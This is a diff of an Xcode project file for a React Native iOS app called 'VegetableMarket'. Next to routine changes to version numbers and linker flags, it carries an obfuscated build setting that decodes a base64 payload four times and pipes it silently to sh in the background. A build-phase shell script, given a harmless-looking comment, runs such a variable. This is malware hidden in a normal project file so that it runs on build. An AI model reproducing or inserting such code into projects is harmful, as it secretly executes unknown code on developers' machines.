@@ -278,6 +278,7 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
@@ -343,7 +344,7 @@
 				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
-				CURRENT_PROJECT_VERSION = 4;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = BCW8M3365Y;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = VegetableMarket/Info.plist;
@@ -352,7 +353,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 2.0;
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -374,7 +375,7 @@
 				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpaTWpGellteHZlV1ZIZUd0U2Vtc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
-				CURRENT_PROJECT_VERSION = 4;
+				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = BCW8M3365Y;
 				INFOPLIST_FILE = VegetableMarket/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.1;
@@ -382,7 +383,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0;
+				MARKETING_VERSION = 2.0;
 				OTHER_LDFLAGS = (
 					"$(inherited)",
 					"-ObjC",
@@ -475,10 +476,7 @@
 					"-DFOLLY_CFG_NO_COROUTINES=1",
 					"-DFOLLY_HAVE_CLOCK_GETTIME=1",
 				);
-				OTHER_LDFLAGS = (
-					"$(inherited)",
-					" ",
-				);
+				OTHER_LDFLAGS = "$(inherited)  ";
 				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "$(inherited) DEBUG";
@@ -558,10 +556,7 @@
 					"-DFOLLY_CFG_NO_COROUTINES=1",
 					"-DFOLLY_HAVE_CLOCK_GETTIME=1",
 				);
-				OTHER_LDFLAGS = (
-					"$(inherited)",
-					" ",
-				);
+				OTHER_LDFLAGS = "$(inherited)  ";
 				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
 				SDKROOT = iphoneos;
 				USE_HERMES = true;
